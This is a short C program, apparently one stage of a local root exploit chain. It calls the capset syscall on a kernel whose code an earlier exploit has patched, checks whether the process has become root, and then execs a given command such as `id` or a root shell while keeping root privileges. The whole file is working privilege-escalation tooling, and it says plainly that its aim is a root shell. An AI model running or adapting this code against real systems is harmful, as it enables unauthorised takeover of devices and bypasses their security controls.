// call_capset.c — invoke the (patched) capset path; if it grants root, optionally run a command.
// Pure syscall probe: no GPU/exploit code. Independent verification of the kernel text patch.
//   call_capset            -> report uid before/after
//   call_capset id         -> become root, then exec `id`
//   call_capset sh         -> root shell
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/syscall.h>

int main(int argc, char **argv) {
    long r = syscall(SYS_capset, (void *)0, (void *)0);
    int rooted = (getuid() == 0 || geteuid() == 0);
    fflush(stdout);
    if (rooted && argc > 1) {
        fprintf(stderr, "[call_capset] rooted (uid=%d euid=%d selinux ctx unchanged); exec %s\n",
                getuid(), geteuid(), argv[1]);
        fflush(stderr);
        execvp(argv[1], &argv[1]);      /* stay root in the exec'd program */
        perror("execvp");
        return 1;
    }
    printf("capset(NULL,NULL) -> %ld errno=%d (%s)\n", r, errno, strerror(errno));
    printf("uid=%d euid=%d gid=%d  %s\n", getuid(), geteuid(), getgid(),
           rooted ? "*** ROOT ***" : "(not root - kernel text not patched?)");
    return rooted ? 0 : 1;
}
